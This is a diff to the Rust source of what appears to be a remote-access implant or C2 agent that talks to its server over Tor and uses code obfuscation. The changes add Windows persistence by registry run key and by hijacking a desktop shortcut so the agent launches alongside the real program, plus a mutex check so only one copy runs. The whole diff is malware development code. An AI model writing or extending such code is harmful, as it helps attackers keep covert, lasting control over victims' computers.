@@ -3,6 +3,7 @@ mod helpers;
 mod exc;
 mod debug;
 mod win_persist;
+mod mutex;
 
 use arti_client::{
     TorClient,
@@ -10,7 +11,6 @@ use arti_client::{
     StreamPrefs,
     DataStream,
 };
-use config::Persistence;
 use goldberg::goldberg_int;
 use tokio::io::{
     AsyncWriteExt,
@@ -48,14 +48,26 @@ struct OutputMessage {
 }
 
 #[inline]
-fn persist(id: &str) -> bool{
+fn persist() -> bool {
         // Persitence:
     match config::persistence() {
-        Persistence::NO => {
+        config::Persistence::None => {
             debug_println!("no persistence mechanism enabled");
         },
-        Persistence::WinRegistryBased => {
-            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone(), &id) {
+        config::Persistence::WindowsRegistry => {
+            debug_println!("'WindowsRegistry' based persistence");
+            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone()) {
+                Ok(_) => {
+                    return true;
+                },
+                Err(e) => {
+                    debug_eprintln!("failed to persist on windows: {}", e);
+                },
+            }
+        },
+        config::Persistence::ShortcutTakeover => {
+            debug_println!("'ShortcutTakeover' based persistence");
+            match win_persist::shortcut_takeover(&config::get_lnk_target_program_path(), &config::get_lnk_shortcut_name()) {
                 Ok(_) => {
                     return true;
                 },
@@ -72,6 +84,22 @@ fn persist(id: &str) -> bool{
 async fn main() {
     helpers::set_working_dir_to_program_dir();
 
+    if config::get_mutex_name().len() != 0 {
+        match mutex::create_program_mutex() {
+            Ok(mutex_already_exists) => {
+                if mutex_already_exists {
+                    // We exit due to another instance of an agent running.
+                    debug_println!("another instance of an agent detected... exiting.");
+                    std::process::exit(0);
+                }
+                debug_println!("no mutex found... first agent instance");
+            },
+            Err(e) => {
+                debug_eprintln!("failed to create program mutex: {}", e);
+            },
+        }
+    }
+
     // Agent's configuration:
     let address = config::get_address();
     let port: u16 = goldberg_int!(80);
@@ -81,6 +109,21 @@ async fn main() {
         Ok(name) => name,
         Err(_) => "unknown".to_string(),
     };
+
+    let args: Vec<String> = env::args().collect();
+    for arg in args.iter() {
+        if arg == "--run-lnk" {
+            match exc::run_and_forget(&config::get_lnk_target_program_path()) {
+                Ok(_) => {},
+                Err(e) => {
+                    debug_println!("failed to run lnk target program: {}", e);
+                },
+            }
+        }
+    }
+
+    let persisted = persist();
+    debug_println!("agent persistence process returned: {}", persisted);
     
     let os_name = env::consts::OS;
     let sys_arch = env::consts::ARCH;
@@ -142,8 +185,6 @@ async fn main() {
             debug_println!("server returned an empty id... critical");
             continue;
         }
-
-        persist(&id);
 
         debug_println!("fetching messages");
 
